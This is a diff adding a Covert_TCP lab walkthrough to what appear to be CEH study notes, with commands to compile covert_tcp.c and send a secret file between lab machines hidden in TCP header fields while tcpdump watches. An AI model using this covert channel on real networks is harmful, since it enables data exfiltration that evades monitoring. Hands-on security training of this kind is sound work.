@@ -204,3 +204,55 @@ To check idle time of the user
 ```
 idletime
 ```
+
+
+
+
+
+## Covert_TCP 
+
+Machine 1
+```
+mkdir Send
+cd Send
+echo "Secret" > message.txt
+```
+```
+Places CEH Tools on Windows
+if not present - 
+Places Network ctrl L smb://10.10.10.10
+copy covert_tcp.c and paste it in linux folder
+```
+To compile
+```
+cc -o covert_tcp covert_tcp.c
+```
+
+Go to other machine 2
+```
+tcpdump -nvvx port 8888 -i lo
+```
+Open new terminal
+```
+cd Desktop
+mkdir Recieve
+cd Recieve
+```
+```
+Places CEH Tools on Windows
+if not present - 
+Places Network ctrl L smb://10.10.10.10
+copy covert_tcp.c and paste it in linux folder
+```
+To compile
+```
+cc -o covert_tcp covert_tcp.c
+```
+```
+ ./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
+```
+
+Goto Machine 1
+```
+./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
+```
